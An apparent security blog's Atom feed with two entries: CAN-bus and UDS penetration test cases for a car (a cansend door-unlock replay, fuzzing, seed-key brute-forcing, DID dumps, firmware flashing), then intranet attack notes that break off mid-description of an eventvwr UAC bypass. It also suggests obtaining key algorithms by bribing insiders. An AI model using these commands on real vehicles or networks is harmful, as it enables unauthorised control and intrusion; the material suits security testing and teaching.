<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-08-03T01:37:43.000Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CAN总线测试样例</title>
    <link href="https://j3f5.github.io/articles/2023/08/03/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/"/>
    <id>https://j3f5.github.io/articles/2023/08/03/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/</id>
    <published>2023-08-03T01:37:43.000Z</published>
    <updated>2023-08-03T01:37:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="can重放逆向"><a class="markdownIt-Anchor" href="#can重放逆向"></a> CAN重放（逆向）</h1><h2 id="测试内容"><a class="markdownIt-Anchor" href="#测试内容"></a> 测试内容</h2><p>由于CAN总线网络通信是广播通信，通过工具按时序截获车辆数据，并且通过二分法等方法来识别控制相应ECU的数据帧ID，并通过在CAN总线网络上重新注入这些数据帧，达到干扰和非法控制某一个或多个ECU的目的。</p><h2 id="测试初始条件"><a class="markdownIt-Anchor" href="#测试初始条件"></a> 测试初始条件</h2><p>已安装能捕获CAN总线数据帧的软件，有相关数据传输的文档。</p><h2 id="项目步骤"><a class="markdownIt-Anchor" href="#项目步骤"></a> 项目步骤</h2><ol><li><p>通过工具对CAN总线中的数据进行录制操作；</p><p>例如用candump录制：<code>candump can0 -l</code></p><p><img src="/../../Mywork/Note/images/CAN%25E6%25B5%258B%25E8%25AF%2595/image-20230718091144778.png" alt="image-20230718091144778" /></p></li><li><p>使用工具重放已录制的CAN总线数据包，可以通过二分法/八分法等方法快速定位ECU相关数据帧</p><p><strong>定位</strong>：<code>cc.py fuzzer identify can.log</code></p><blockquote><p>注意：cc.py识别的数据帧只是后半段，我们需要对数据进行处理：<code>cat candump-2023-07-17_144128.log | awk '&#123;print $3&#125;'</code>（只要第三段）</p><p>观察汽车的特征，选择y/n（二分法）来定位包。此时我观察到，当包发生在有100#的特权马的时候，他就会出现<strong>闪灯</strong>、<strong>车门锁发出声响</strong>等迹象，则判断此为我们想要的包。</p></blockquote></li><li><p>重放捕获的数据帧，验证是否能触发ECU的状态改变</p><p><strong>重放验证</strong>：<code>cansend can0 010#053509a87f088000 </code></p><blockquote><p>注意：此时发送一个包只会让车门开一会，我们需要发送3个包以上，才能保证车门完全开启</p></blockquote><p><strong>重放验证2</strong>：<code>canplayer</code></p><blockquote><p>注意：此版完成后，发现完成开关车门需要好几个包同时配合：</p><ol><li>开门锁</li><li>闪灯（这个是和开门锁同时的，测不出来包）</li><li>镜头转向</li></ol></blockquote></li></ol><h2 id="结果"><a class="markdownIt-Anchor" href="#结果"></a> 结果</h2><h3 id="预期"><a class="markdownIt-Anchor" href="#预期"></a> 预期</h3><p>发现控制ECU的关键数据帧，重放之可以控制改ECU。</p><h3 id="实际"><a class="markdownIt-Anchor" href="#实际"></a> 实际</h3><p>发送一个包只会让车门开一会，我们需要发送3个包以上，才能保证车门完全开启。</p><h1 id="can-fuzz"><a class="markdownIt-Anchor" href="#can-fuzz"></a> CAN-FUZZ</h1><h2 id="测试内容-2"><a class="markdownIt-Anchor" href="#测试内容-2"></a> 测试内容</h2><p>通过工具对CAN总线控制ECU的数据帧进行模糊测试，从而发现控制相关ECU的关键数据帧。</p><h2 id="测试初始条件-2"><a class="markdownIt-Anchor" href="#测试初始条件-2"></a> 测试初始条件</h2><p>已安装能捕获CAN总线数据帧的软件。</p><h2 id="项目步骤-2"><a class="markdownIt-Anchor" href="#项目步骤-2"></a> 项目步骤</h2><ol><li>使用工具根据时序对CAN总线发送大量递增的数据帧</li><li>在此过程中，如果车辆相关ECU状态发生变化，则暂停，并且重放该段数据帧，使用二分法查找对应关键数据帧</li></ol><h2 id="结果-2"><a class="markdownIt-Anchor" href="#结果-2"></a> 结果</h2><h3 id="预期-2"><a class="markdownIt-Anchor" href="#预期-2"></a> 预期</h3><p>能够发现控制各个ECU部件的相关数据帧</p><h3 id="实际-2"><a class="markdownIt-Anchor" href="#实际-2"></a> 实际</h3><p>通过大量数据帧的发送，能够发现一些ECU一闪而逝的状态变化。查找关键数据帧的过程比较漫长</p><h1 id="can总线数据篡改攻击can总线数据欺骗攻击"><a class="markdownIt-Anchor" href="#can总线数据篡改攻击can总线数据欺骗攻击"></a> CAN总线数据篡改攻击/CAN总线数据欺骗攻击</h1><h2 id="测试内容-3"><a class="markdownIt-Anchor" href="#测试内容-3"></a> 测试内容</h2><p>攻击者通过截获CAN总线上的有效数据帧，甚至可以伪造这些有效的CAN数据帧，并将其重新发送到总线上，以模拟合法节点操作对车辆的某些功能进行欺骗，或改变车辆的行为或者性能。</p><h2 id="测试初始条件-3"><a class="markdownIt-Anchor" href="#测试初始条件-3"></a> 测试初始条件</h2><p>已安装能捕获CAN总线数据帧的软件。</p><h2 id="项目步骤-3"><a class="markdownIt-Anchor" href="#项目步骤-3"></a> 项目步骤</h2><ol><li>使用工具捕获CAN总线上的数据帧，并观察与找出那些是控制ECU的关键数据帧</li><li>保存记录这些关键数据帧，重复发送原数据帧或将在线数据帧篡改成恶意数据帧来欺骗或者修改其状态。</li></ol><h2 id="结果-3"><a class="markdownIt-Anchor" href="#结果-3"></a> 结果</h2><h3 id="预期-3"><a class="markdownIt-Anchor" href="#预期-3"></a> 预期</h3><p>截获速度提升的数据帧，修改普通数据帧为该数据帧，并放行，仪表盘的速度指针变快</p><h1 id="can网关测试"><a class="markdownIt-Anchor" href="#can网关测试"></a> CAN网关测试</h1><h2 id="测试内容-4"><a class="markdownIt-Anchor" href="#测试内容-4"></a> 测试内容</h2><h3 id="数据帧健康异常测试"><a class="markdownIt-Anchor" href="#数据帧健康异常测试"></a> 数据帧健康/异常测试</h3><ul><li>网关宜根据通信矩阵中的信号定义，对数据帧中的信号值进行检查，检查内容包括信号值长度、信号值有效性等；</li><li>网关宜具有数据帧异常检测功能，即检查和记录数据帧之间发送与接收关系的机制。</li></ul><h2 id="测试初始条件-4"><a class="markdownIt-Anchor" href="#测试初始条件-4"></a> 测试初始条件</h2><h2 id="项目步骤-4"><a class="markdownIt-Anchor" href="#项目步骤-4"></a> 项目步骤</h2><ul><li>检测设备对网关发送一个或多个信号长度不符合通信矩阵定义的数据帧，在指定的目的端口检测接收到的数据帧，并收集样件日志；</li><li>检测设备对网关发送一个或多个信号值不符合通信矩阵定义的数据帧，在指定的目的端口检测接收到的数据帧，并收集样件日志；</li></ul><h2 id="结果-4"><a class="markdownIt-Anchor" href="#结果-4"></a> 结果</h2><p>正确检查了数据帧信号值的长度与有效性等参数，对异常的数据帧，都会被记录到相关的样件日志中。</p><h1 id="uds服务发现"><a class="markdownIt-Anchor" href="#uds服务发现"></a> UDS服务发现</h1><h2 id="测试内容-5"><a class="markdownIt-Anchor" href="#测试内容-5"></a> 测试内容</h2><p>发现所有UDS会话，从而发现相应的ECU ID，枚举该ECU的所有服务和子服务，从而发现ECU中可能出现的弱点。由于UDS规定的SID只有一个字节，因此只需要遍历00-FF，参数部分可以适当随机一两个字节。 例如遍历 <code>03 【00-FF】 01 01</code>，有+0x40的响应就说明ECU支持该服务。</p><h2 id="测试初始条件-5"><a class="markdownIt-Anchor" href="#测试初始条件-5"></a> 测试初始条件</h2><h2 id="项目步骤-5"><a class="markdownIt-Anchor" href="#项目步骤-5"></a> 项目步骤</h2><ol><li><p>使用不同会话（<code>02 10 01/02/03</code>）联系ECU，观察其反应，如果有响应，则为存在该ECU，记录该ID。具体而言，我们可以使用工具发现会话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">─# cc.py uds discovery                     </span><br><span class="line">+------------+------------+</span><br><span class="line">| CLIENT ID  | SERVER ID  |</span><br><span class="line">+------------+------------+</span><br><span class="line">| 0x00000733 | 0x00000633 |</span><br><span class="line">| 0x000007df | 0x000007f9 |</span><br><span class="line">| 0x000007f1 | 0x000007f9 |</span><br><span class="line">| 0x000007ff | 0x00000633 |</span><br><span class="line">+------------+------------+</span><br></pre></td></tr></table></figure></li><li><p>枚举会话的相关服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─# cc.py uds services 0x733 0x633</span><br><span class="line">Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL</span><br><span class="line">Supported service 0x11: ECU_RESET</span><br><span class="line">Supported service 0x14: CLEAR_DIAGNOSTIC_INFORMATION</span><br><span class="line">Supported service 0x19: READ_DTC_INFORMATION</span><br><span class="line">Supported service 0x22: READ_DATA_BY_IDENTIFIER</span><br><span class="line">Supported service 0x23: READ_MEMORY_BY_ADDRESS</span><br><span class="line">Supported service 0x2a: READ_DATA_BY_PERIODIC_IDENTIFIER</span><br><span class="line">Supported service 0x2c: DYNAMICALLY_DEFINE_DATA_IDENTIFIER</span><br><span class="line">Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER</span><br><span class="line">Supported service 0x31: ROUTINE_CONTROL</span><br><span class="line">Supported service 0x3e: TESTER_PRESENT</span><br><span class="line">Supported service 0xaf: Unknown service</span><br></pre></td></tr></table></figure></li></ol><h2 id="结果-5"><a class="markdownIt-Anchor" href="#结果-5"></a> 结果</h2><p>发现相关服务，可以进一步构建威胁模型，对汽车进行进一步攻击。</p><h1 id="ecu-复位与-sessions切换安全"><a class="markdownIt-Anchor" href="#ecu-复位与-sessions切换安全"></a> ECU 复位与 Sessions切换安全</h1><h2 id="测试内容-6"><a class="markdownIt-Anchor" href="#测试内容-6"></a> 测试内容</h2><p>在车辆行驶时，要求ECU不应该响应特定的会话切换命令（<code>02 10 02</code>），并且不应该出现进入编程模式后无法恢复到普通模式的情况。此时，在汽车车辆静止、车辆低速行驶、车辆高速行驶、车辆低电量、车辆远程等工况中随机发送切换会话的指令（<code>02 10 02/03</code>），和复位会话指令（<code>02 11 01/02/03</code>），观察其会话的变化，评估车辆内部ECU在不同工况和会话模式下的稳定性和响应能力。</p><h2 id="测试初始条件-6"><a class="markdownIt-Anchor" href="#测试初始条件-6"></a> 测试初始条件</h2><h2 id="项目步骤-6"><a class="markdownIt-Anchor" href="#项目步骤-6"></a> 项目步骤</h2><ol><li><strong>不同工况选择：</strong> 测试会在不同的车辆工况下进行，包括：<ul><li>车辆静止</li><li>车辆低速行驶</li><li>车辆高速行驶</li><li>车辆升级（可能指软件或固件升级）</li></ul></li><li><strong>随机发送指令：</strong> 在每个工况下，会随机选择发送以下三种会话切换请求消息：<ul><li>02 10 01</li><li>02 10 02</li><li>02 10 03</li></ul></li><li><strong>观察响应情况：</strong> 在每个工况下，观察并记录车辆内部的ECU对发送的指令的响应情况。</li><li><strong>发送复位指令</strong>：在不同会话、不同工况下，发送复位命令后，记录车辆的响应和表现。这可以包括车辆是否重新启动、恢复正常模式等情况。指令为：<ul><li>02 11 01</li><li>02 11 02</li><li>02 11 03</li></ul></li></ol><h2 id="结果-6"><a class="markdownIt-Anchor" href="#结果-6"></a> 结果</h2><p>汽车在行驶过程中可以对ECU会话进行复位，并且不会响应特定的会话切换命令。在复位后，车辆没有重新启动。</p><p>而没有行驶时，车辆重启：</p><p><img src="/images/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/image-20230803140624032.png" alt="image-20230803140624032" /></p><h1 id="uds种子密钥安全性测试安全访问-27"><a class="markdownIt-Anchor" href="#uds种子密钥安全性测试安全访问-27"></a> UDS种子密钥安全性测试（安全访问 27）</h1><h2 id="测试内容-7"><a class="markdownIt-Anchor" href="#测试内容-7"></a> 测试内容</h2><p>安全访问常见威胁为：种子随机度不足、未限制Seed尝试次数、未限制Key尝试次数、安全算法泄露等</p><h2 id="测试初始条件-7"><a class="markdownIt-Anchor" href="#测试初始条件-7"></a> 测试初始条件</h2><h2 id="项目步骤-7"><a class="markdownIt-Anchor" href="#项目步骤-7"></a> 项目步骤</h2><p>**种子随机度及Seed尝试次数测试：**切换到编程模式或扩展模式下多次发送<code>02 27 01</code>，观察Seed的长度，Seed是否会更新，更新是否有规律。一般认为Seed Key在4字节以上才算基本安全</p><p><strong>Key尝试次数测试：</strong> 以Key为4字节为例，发送<code>02 27 01</code>后，遍历发送<code>06 27 02 【AA BB CC DD】</code> ，观察消极响应的错误码是否会发生改变。</p><p><strong>安全算法泄露：</strong> 可以通过地下论坛、买通企业内部人员、Tier1泄露、固件逆向等找到原始的诊断Key算法。还可以通过购买通用的诊断仪如X-431，各种清DTC设备等，分析多个解锁Seed Key找出规律。</p><h2 id="结果-7"><a class="markdownIt-Anchor" href="#结果-7"></a> 结果</h2><p>如上</p><h1 id="uds敏感数据读取"><a class="markdownIt-Anchor" href="#uds敏感数据读取"></a> UDS敏感数据读取</h1><h2 id="测试内容-8"><a class="markdownIt-Anchor" href="#测试内容-8"></a> 测试内容</h2><p>通过DID读取数据服务，服务ID是0x22。通过22服务可以请求一个DID的数据，也可以请求多个，其数量限制也由OEM和供应商来约定。无论请求的DID数量是多少，只要满足数量限制，那么ECU都应该在一次肯定响应里包含所有数据。</p><h2 id="测试初始条件-8"><a class="markdownIt-Anchor" href="#测试初始条件-8"></a> 测试初始条件</h2><h2 id="项目步骤-8"><a class="markdownIt-Anchor" href="#项目步骤-8"></a> 项目步骤</h2><p>遍历did范围为：<code>0x0000-0xffff</code>。确定呼应为<code>62+DID+数据</code>，否认呼应为<code>7f+22+NRC码</code> 当客户端发送<code>22+F186</code>这个请求时，接收端确定会前往以后的会话状况， 返回如<code>62+F186+（01 or 02 or 03）</code>的数据包</p><h2 id="结果-8"><a class="markdownIt-Anchor" href="#结果-8"></a> 结果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~]</span><br><span class="line">└─$ cc.py uds dump_dids 0x733 0x633</span><br><span class="line"></span><br><span class="line">-------------------</span><br><span class="line">CARING CARIBOU v0.4</span><br><span class="line">-------------------</span><br><span class="line"></span><br><span class="line">Loading module &#x27;uds&#x27;</span><br><span class="line"></span><br><span class="line">Dumping DIDs in range 0x0000-0xffff</span><br><span class="line"></span><br><span class="line">Identified DIDs:</span><br><span class="line">DID    Value (hex)</span><br><span class="line">0xd134 62d13400</span><br><span class="line">0xd211 62d21105ffffffff04ffffffff06ffffffff04ffffffff06ffffffff04ffffffff06ffffffff04ffffffff02ffffffff07ffffffff</span><br><span class="line">0xd902 62d90200</span><br><span class="line">0xd903 62d903cfcf</span><br><span class="line">0xd904 62d90476</span><br><span class="line">0xd906 62d9063232</span><br><span class="line">0xd909 62d90976</span><br><span class="line">0xd910 62d910ffff</span><br><span class="line">0xd911 62d91101</span><br><span class="line">0xd914 62d91404</span><br><span class="line">0xd915 62d91504</span><br><span class="line">0xd916 62d91600</span><br><span class="line">0xd917 62d91700</span><br><span class="line">0xd918 62d91800</span><br><span class="line">0xd919 62d91901</span><br><span class="line">0xd920 62d92001</span><br><span class="line">0xd921 62d92100</span><br><span class="line">0xd922 62d9220000</span><br><span class="line">0xda00 62da000496ff940baa</span><br><span class="line">0xda01 62da01fc08ff780bf5</span><br><span class="line">0xda02 62da0201</span><br><span class="line">0xda03 62da0301</span><br><span class="line">0xdd00 62dd00ffffffff</span><br><span class="line">0xdd01 62dd0100ffff</span><br><span class="line">0xdd02 62dd02ff</span><br><span class="line">0xdd0a 62dd0a01</span><br><span class="line">0xdd0b 62dd0b000800</span><br><span class="line">0xdd0c 62dd0c00</span><br><span class="line">0xe103 62e10300000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0xed20 62ed20f1a08888398000202045f1aa8888788308202041f1ab8888754619202043f18c30497611f1ae03888869688820204288886968902020428888939131202042</span><br><span class="line">0xeda0 62eda0f12031661232204145f12a31666456204141f12bffffffff202020f18c30497611f12e03316663532041423166635520414232250007204142</span><br><span class="line">0xf120 62f12031661232204145</span><br><span class="line">0xf121 62f12131661230204142</span><br><span class="line">0xf125 62f12531661225204144</span><br><span class="line">0xf126 62f126001e020002040003ffffff001e020000040003001e030001040003001e0313040400030000ffffffffffff0000ffffffffffff</span><br><span class="line">0xf12a 62f12a31666456204141</span><br><span class="line">0xf12b 62f12bffffffff202020</span><br><span class="line">0xf12e 62f12e03316663532041423166635520414232250007204142</span><br><span class="line">0xf186 62f18601</span><br><span class="line">0xf18c 62f18c30497611</span><br><span class="line">0xf1a0 62f1a08888398000202045</span><br><span class="line">0xf1a1 62f1a18888398001202042</span><br><span class="line">0xf1a5 62f1a58888397961202044</span><br><span class="line">0xf1aa 62f1aa8888788308202041</span><br><span class="line">0xf1ab 62f1ab8888754619202043</span><br><span class="line">0xf1ae 62f1ae03888869688820204288886968902020428888939131202042</span><br><span class="line">0xf1fd 62f1fd31352e30302e3030</span><br><span class="line">Done!</span><br></pre></td></tr></table></figure><h1 id="uds捣乱服务"><a class="markdownIt-Anchor" href="#uds捣乱服务"></a> UDS捣乱服务</h1><h2 id="测试内容-9"><a class="markdownIt-Anchor" href="#测试内容-9"></a> 测试内容</h2><p>在各种工况条件下测试车辆在接收到其他CAN指令时（如28指令），是否会导致整车的ECU出现故障</p><h2 id="测试初始条件-9"><a class="markdownIt-Anchor" href="#测试初始条件-9"></a> 测试初始条件</h2><h2 id="项目步骤-9"><a class="markdownIt-Anchor" href="#项目步骤-9"></a> 项目步骤</h2><p>分别在各种条件(静止、行驶、低电压等)上发送28命令和85命令，观察车内ECU是否有响应和动作。</p><h2 id="结果-9"><a class="markdownIt-Anchor" href="#结果-9"></a> 结果</h2><p>实际测试中某些整车发送28后，整车控制会部分失灵、仪表显示也会异常，但一般动力相关ECU仍能正常动作(也可能进入失效模式)</p><h1 id="uds固件刷写"><a class="markdownIt-Anchor" href="#uds固件刷写"></a> UDS固件刷写</h1><h2 id="测试内容-10"><a class="markdownIt-Anchor" href="#测试内容-10"></a> 测试内容</h2><p>固件刷写中主要威胁点在于34 36未做相关的限制条件。使其可以在不进行安全认证或不安全的条件下进行刷写。</p><h2 id="测试初始条件-10"><a class="markdownIt-Anchor" href="#测试初始条件-10"></a> 测试初始条件</h2><h2 id="项目步骤-10"><a class="markdownIt-Anchor" href="#项目步骤-10"></a> 项目步骤</h2><p>分别尝试在普通模式、编程模式、扩展模式下发送固件刷写相关命令。切换会话的条件，发送相关命令。</p><p><img src="/images/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/84d32e0f7176c23c7ca5928eb869d02d.png" alt="image.png" /></p><h2 id="结果-10"><a class="markdownIt-Anchor" href="#结果-10"></a> 结果</h2><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><ol><li><p><a href="https://blog.ffxiv.cat/174/">UDS诊断渗透测试思路</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/37310388">UDS诊断入门</a></p></li><li><p><a href="https://iotsec-zone.com/article?id=393">UDS刷写安全</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;can重放逆向&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#can重放逆向&quot;&gt;&lt;/a&gt; CAN重放（逆向）&lt;/h1&gt;
&lt;h2 id=&quot;测试内容&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#测试内容&quot;&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全（二）——补充版</title>
    <link href="https://j3f5.github.io/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/"/>
    <id>https://j3f5.github.io/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/</id>
    <published>2023-07-28T02:07:35.000Z</published>
    <updated>2023-07-28T02:07:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>鉴于之前的内网安全这篇文章所述内容与实战相差还是有点大，没有很清晰的思路或者更加常用的方法来进行内网渗透，这里将结合之前的部分知识，拓展内网渗透攻击面，其中会涉及到很多名词，例如：</p><ul><li>委派机制（约束与非约束）</li><li>Exchange、OWA</li><li>SYSVOL、NETLOGON目录、GPP目录等</li><li>…</li></ul><p>但是万变不离其宗，思路为：</p><ol><li><p>拿下边缘主机，做好权限维持，网段进行扫描发现主机</p><ol><li>如若必要，权限提升</li><li>如若必要，进行免杀</li></ol></li><li><p>横向，隧道/代理</p><ol><li>横向包括文件传输与命令执行、权限提升与维持</li><li>代理隧道需要确定通行的协议</li><li>横向中常遇到的一些服务</li></ol></li><li><p>域控</p><ol><li>获得权限三板斧：组策略、哈希碰撞、金银票据</li><li>这个还涉及dump凭证的操作，在内网主机中也适用</li></ol></li></ol><p>其实不仅如此，内网安全包括域渗透和工作组渗透。</p><p>基于此思路，。此篇文章从三个方面做总结，分别为边缘+横向+域控。</p><h1 id="边缘安全"><a class="markdownIt-Anchor" href="#边缘安全"></a> 边缘安全</h1><p>攻击内网的第一个要点就是攻击网络主机，DMZ区主机，这些主机通常有WEB服务，通过攻击WEB服务，很可能就可以GETSHELL。而内网中的攻击更多是攻击服务组件、端口、版本漏洞等。思路也差不多：</p><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><p>包括计划任务、日志（linux命令行、Windows登录成功日志）、补丁（包括版本信息，内核信息）、运行的服务与程序（包括看杀软）、linux提权需要注意的文件、端口信息、凭证信息等等。</p><h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3><p>windows计划任务：<code>schtasks /query</code></p><p>linux计划任务存放在几个目录/文件下：</p><ul><li><code>/etc/crontab</code>：存放系统级别的计划任务（不是脚本）。</li><li><code>/var/spoon/cron</code>：存放用户级别的自定义计划任务。</li><li><code>/etc/cron.d/</code>：在这个文件夹中，可以放置以任意名称命名的<strong>cron文件</strong>，每个文件对应一个独立的计划任务。这些cron文件可以包含特定格式的计划任务配置。</li><li><code>crontab</code> 命令：这不是文件夹或文件，而是一个用于管理用户级别cron任务的命令。通过运行 <code>crontab -e</code> 命令，用户可以编辑自己的cron任务。</li><li><code>/etc/cron.&#123;daily, weekly, monthly&#125;/</code>：这些文件夹中存放的是预定义的<strong>cron脚本</strong>，用于执行日常、每周或每月的任务。系统会在预定的时间自动运行这些脚本。</li></ul><h3 id="重要端口"><a class="markdownIt-Anchor" href="#重要端口"></a> 重要端口</h3><p>windows：</p><ul><li>88端口，监听KDC请求，用于Kerberos金银票据的伪造</li><li>135端口：RPC，wmic服务利用</li><li>137、138、139（Samba）端口：NetBios，未授权访问，可以用于发现局域网主机（工具<code>nbtscan</code>）和查看局域网共享资源</li><li>389端口：LDAP</li><li>443端口：HTTPS、Exchange服务（接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露 …）</li><li>445端口：smb服务，Windows 协议簇，主要功能为文件共享服务。可以使用IPC连接（<code>net use</code>），可以使用弱口令、远程命令执行</li><li>3389端口：RDP服务，可以安插粘滞键后门（shift）</li><li>5985端口：WinRM服务，可以用来针对某些高版本Windows, 弱口令, 远程执行, 后门植入</li><li>其他的就是</li></ul><p>数据库：</p><ul><li>1433：MSSQL</li><li>1521：ORACLE</li><li>3306：MYSQL</li><li>5432：POSTGESQL</li><li>6379：REDIS</li></ul><h3 id="敏感信息"><a class="markdownIt-Anchor" href="#敏感信息"></a> 敏感信息</h3><h3 id="凭证信息"><a class="markdownIt-Anchor" href="#凭证信息"></a> 凭证信息</h3><h2 id="windows本地提权"><a class="markdownIt-Anchor" href="#windows本地提权"></a> Windows本地提权</h2><p>之前的文章提到，Windows提权主要有</p><ol><li>at、sc计划任务执行命令的提权，这个是早期win的逻辑错误</li><li>服务提权：如果该服务执行的程序路径没有双引号，且有空格，则可以提权；如果该服务路径可以改成自己程序的路径，也行</li><li>dll劫持：查看高权限运行的第三方软件都调用了什么dll（动态调用，一定会调用的），替换之</li><li>然后就是常用的：令牌窃取+烂土豆提权（该用户需要满足模拟令牌的权限）+溢出漏洞</li></ol><p>由于溢出漏洞等等讲得不多，所以多增加一些，加上一些可能会遇到的场景。</p><h3 id="uacbypass"><a class="markdownIt-Anchor" href="#uacbypass"></a> UAC（Bypass）</h3><p>英文名：User Account Control。他有几个档位，中级/高级/默认等等。一旦设置了，那么执行需要管理员权限的操作时，就会弹窗确认。这时候，我们的一些软件，例如Mimikatz就用不了了，所以需要Bypass，达到<code>High Mandatory Level</code>即可。可以手工，也可以使用MSF（里面好多payload）。</p><p>通常，我们可以使用eventvwr.exe程序绕过，该程序允许普通用户以管理员权限运行eventvwr.exe，而无需提供管理员凭据（用于查看系统的事件日志，这也是正常的行为）。该漏洞已经被新版本的Windows修复啦。</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164019438.png" alt="image-20230731164019438" style="zoom:50%;" /><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164100532.png" alt="image-20230731164100532" style="zoom: 33%;" /><h4 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h4><p>大概路线：</p><ol><li>创建一个伪装的eventvwr.exe程序，并将其存储在受攻击者控制的目录下，通常是用户目录或可写的临时目录。</li><li>在注册表中创建一个伪装的eventvwr.exe应用程序路径键值，将它指向伪装的eventvwr.exe路径。</li><li>触发eventvwr.exe运行，由于Windows默认会在PATH中查找可执行文件，因此系统将使用注册表中伪装的路径启动eventvwr.exe。</li><li>由于eventvwr.exe是允许以管理员权限运行的程序，因此伪装的eventvwr.exe也会以管理员权限运行，从而绕过了UAC提示。</li><li>通常，配合反弹shell，完成提权</li></ol><p>使用<code>whoami /all</code>查看权限，看是否在管理员用户组中，如果在，并且不是High Mandatory Level，那么就<strong>可能</strong>需要进行Bypass了。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/172605390-b7dfb995-c707-45cd-be78-9c7d2f23c4a5.png" alt="OnPaste 20220608-165652" /></p><p>进一步确认是否存在UAC，执行以下命令，如果EnableLUA为0则不需要Bypass，如果为1且<code>PromptSecureDesktop</code>也为1，则可以进行Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System </span><br></pre></td></tr></table></figure><p>查看是否存在eventvwr程序，并且查看是否存在提权条件（<a href="https://github.com/k4sth4/UAC-bypass/blob/main/strings64.exe">string64.exe</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where /r C:\\windows eventvwr.exe</span><br><span class="line">strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure><p>如果存在，则编译exploit，这个程序可以伪造注册表，到我们指定的目录：<a 